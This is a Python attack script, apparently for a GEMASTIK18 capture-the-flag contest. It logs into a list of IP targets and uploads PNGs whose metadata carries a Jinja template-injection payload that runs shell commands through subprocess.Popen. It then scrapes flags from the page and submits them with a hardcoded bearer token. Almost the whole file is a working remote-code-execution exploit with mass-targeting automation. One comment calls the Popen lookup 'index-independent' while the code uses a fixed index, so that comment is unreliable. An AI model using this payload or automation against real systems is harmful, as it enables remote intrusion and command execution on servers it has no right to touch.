#!/usr/bin/env python3
import io
import re
import sys
import time
import json
import random
import string
import argparse
from typing import List, Set, Dict, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from PIL import Image, PngImagePlugin

# -------------------------
# Defaults (edit or override via CLI)
# -------------------------

# Targets (host:port). If no port is given, will default to :8000
DEFAULT_TARGETS = [
    "47.128.189.162:12000",
    "47.130.186.160:12000",
    # "54.151.174.166:12000",
    "47.129.232.208:12000",
    "18.136.104.104:12000",
    "3.0.59.42:12000",
    "13.213.66.91:12000",
    "13.215.174.231:12000",
    "13.213.9.98:12000",
    "13.250.110.172:12000",
    "52.77.254.10:12000",
    "18.136.203.203:12000",
    "18.142.47.188:12000",
    "3.0.95.52:12000",
    "13.215.162.81:12000",
    "13.229.104.126:12000",
    "13.229.240.234:12000",
    "13.229.67.66:12000",
    "54.169.34.94:12000",
    "47.129.211.16:12000",
]

HTTP_TIMEOUT = 12
MAX_WORKERS = 12

# Exact flag format you gave
FLAG_RE = re.compile(r"GEMASTIK18\{[A-Za-z0-9/+=_\-]{10,}\}")

# Submission endpoint (per your spec)
SUBMIT_URL = "https://gemastik-api.siberlab.id/api/flag"

# -------------------------
# Helpers
# -------------------------


def base_url(host_port: str) -> str:
    if ":" not in host_port:
        host_port += ":8000"
    return f"http://{host_port}"


def rands(n=10) -> str:
    import string as s

    return "".join(random.choice(s.ascii_lowercase + s.digits) for _ in range(n))


def make_png_payload_bytes(cmd: str) -> bytes:
    """
    Create a 1x1 PNG with iTXt key "Date Created" containing a Jinja payload
    that resolves subprocess.Popen by name and runs `cmd`, returning stdout.
    """
    img = Image.new("RGB", (1, 1), (255, 255, 255))
    pi = PngImagePlugin.PngInfo()

    # Robust, index-independent Popen lookup:
    # ''.__class__ -> str ; MRO[1] -> 'type' ; __subclasses__() -> list of classes
    # selectattr('__name__','equalto','Popen') | first -> subprocess.Popen class
    payload = "{{ (''.__class__.__mro__[1].__subclasses__()[256]('cat /flag.txt', shell=True, stdout=-1).stdout.read()) }}"
    # Minimal single-quote escaping for shell=True
    # safe_cmd = cmd.replace("'", r"'\''")
    # payload = jinja % safe_cmd

    pi.add_text("Date Created", "2025:10:28 02:17:17 " + payload)
    buf = io.BytesIO()
    img.save(buf, "PNG", pnginfo=pi)
    return buf.getvalue()


def register_and_login(sess: requests.Session, base: str) -> bool:
    u = f"{base}/register"
    l = f"{base}/login"
    username = f"user_{rands(8)}"
    password = f"P@ss_{rands(12)}"

    try:
        r = sess.post(
            u,
            data={"username": username, "password": password},
            timeout=HTTP_TIMEOUT,
            allow_redirects=True,
        )
        if r.status_code not in (200, 302):
            print(f"[!] {base} register HTTP {r.status_code}", file=sys.stderr)
            return False
    except Exception as e:
        print(f"[!] {base} register error: {e}", file=sys.stderr)
        return False

    try:
        r = sess.post(
            l,
            data={"username": username, "password": password},
            timeout=HTTP_TIMEOUT,
            allow_redirects=True,
        )
        if r.status_code not in (200, 302):
            print(f"[!] {base} login HTTP {r.status_code}", file=sys.stderr)
            return False
    except Exception as e:
        print(f"[!] {base} login error: {e}", file=sys.stderr)
        return False

    return True


def upload_png(sess: requests.Session, base: str, png_bytes: bytes) -> bool:
    u = f"{base}/upload"
    files = {"image": ("flag.png", png_bytes, "image/png")}
    data = {"title": "auto"}
    try:
        r = sess.post(
            u, files=files, data=data, timeout=HTTP_TIMEOUT, allow_redirects=True
        )
        if r.status_code not in (200, 302):
            print(f"[!] {base} upload HTTP {r.status_code}", file=sys.stderr)
            return False
        return True
    except Exception as e:
        print(f"[!] {base} upload error: {e}", file=sys.stderr)
        return False


def latest_post_id(sess: requests.Session, base: str) -> str:
    g = f"{base}/gallery"
    try:
        r = sess.get(g, timeout=HTTP_TIMEOUT)
        if r.status_code != 200:
            print(f"[!] {base} GET /gallery HTTP {r.status_code}", file=sys.stderr)
            return ""
        m = re.search(r"/post/(\d+)", r.text)
        return m.group(1) if m else ""
    except Exception as e:
        print(f"[!] {base} GET /gallery error: {e}", file=sys.stderr)
        return ""


def get_post_html(sess: requests.Session, base: str, pid: str) -> str:
    p = f"{base}/post/{pid}"
    try:
        r = sess.get(p, timeout=HTTP_TIMEOUT)
        if r.status_code != 200:
            print(f"[!] {base} GET /post/{pid} HTTP {r.status_code}", file=sys.stderr)
            return ""
        return r.text
    except Exception as e:
        print(f"[!] {base} GET /post/{pid} error: {e}", file=sys.stderr)
        return ""


def extract_flags(html: str) -> List[str]:
    return list(dict.fromkeys(FLAG_RE.findall(html)))


def submit_flag(flag: str, token: str) -> Tuple[bool, str]:
    """
    Submit a single flag per the API you provided.
    Returns (ok, message).
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    data = {"flag": flag}
    try:
        r = requests.post(SUBMIT_URL, headers=headers, json=data, timeout=15)
    except Exception as e:
        return False, f"network error: {e}"
    try:
        resp = r.json()
    except Exception:
        resp = {"message": r.text.strip()[:200]}
    if r.status_code == 200:
        return True, resp.get("message", "OK")
    return False, resp.get("message", f"HTTP {r.status_code}")


def run_once(host_port: str, cmd: str) -> Tuple[str, List[str]]:
    base = base_url(host_port)
    sess = requests.Session()

    if not register_and_login(sess, base):
        return host_port, []

    png = make_png_payload_bytes(cmd)  # default: "cat /flag.txt"
    if not upload_png(sess, base, png):
        return host_port, []

    pid = latest_post_id(sess, base)
    if not pid:
        print(f"[!] {base} no /post/<id> found", file=sys.stderr)
        return host_port, []

    html = get_post_html(sess, base, pid)
    if not html:
        return host_port, []

    return host_port, extract_flags(html)


# -------------------------
# Main
# -------------------------


def main():
    ap = argparse.ArgumentParser(
        description="GEMASTIK18 SSTI metadata flag harvester + submitter"
    )
    ap.add_argument(
        "--targets", nargs="*", default=DEFAULT_TARGETS, help="list of host[:port]"
    )
    ap.add_argument("--workers", type=int, default=MAX_WORKERS)
    ap.add_argument("--cmd", default="cat /flag.txt", help="command to run via SSTI")
    ap.add_argument(
        "--token", default="", help="Bearer token for submission (optional)"
    )
    ap.add_argument(
        "--no-submit", action="store_true", help="only print flags, do not submit"
    )
    ap.add_argument(
        "--flag-re",
        default=r"GEMASTIK18\{[A-Za-z0-9/+=_\-]{10,}\}",
        help="flag regex (default matches GEMASTIK18{...})",
    )
    args = ap.parse_args()

    # Allow overriding regex from CLI
    global FLAG_RE
    FLAG_RE = re.compile(args.flag_re)

    if not args.targets:
        print("[!] No targets", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Attacking {len(args.targets)} targets with {args.workers} workers")

    all_flags: List[str] = []
    seen: Set[str] = set()

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = [ex.submit(run_once, t, args.cmd) for t in args.targets]
        for fut in as_completed(futs):
            target, flags = fut.result()
            if flags:
                print(f"[+] {target}: {len(flags)} flag(s)")
            for f in flags:
                if f not in seen:
                    seen.add(f)
                    all_flags.append(f)

    if not all_flags:
        print("[*] No flags found")
        return

    print(f"[*] Total unique flags: {len(all_flags)}")
    for f in all_flags:
        print(f)

    # Submit flags one-by-one per API spec
    print("[*] Submitting flags one-by-one...")
    for f in all_flags:
        # Only submit the content inside the GEMASTIK18{}
        flag = f.split("GEMASTIK18{")[1].split("}")[0]
        ok, msg = submit_flag(
            flag,
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MTYxMjY1NCwianRpIjoiZGYzY2FiNWMtNWI2Ny00OTRmLWFhMDYtM2I0OWE5N2ZjMDI0IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6Imtlc3Nva3Ugbm8gc2FpZ28gbm8gdGF0YWthaSIsIm5iZiI6MTc2MTYxMjY1NCwiY3NyZiI6IjJhNmI3Y2Q3LTMwMjMtNDA3Ni1hNmE4LWVmNmZkNThhMzdkNCIsImV4cCI6MTc2MTY5OTA1NH0.woNo3ovxraYYDbpxl0iRAql3djRCeKZZ13t2U8YXQ0M",
        )
        status = "OK" if ok else "ERR"
        print(f"{status} submit {flag} -> {msg}")
        # small delay to be gentle
        time.sleep(0.2)


if __name__ == "__main__":
    main()
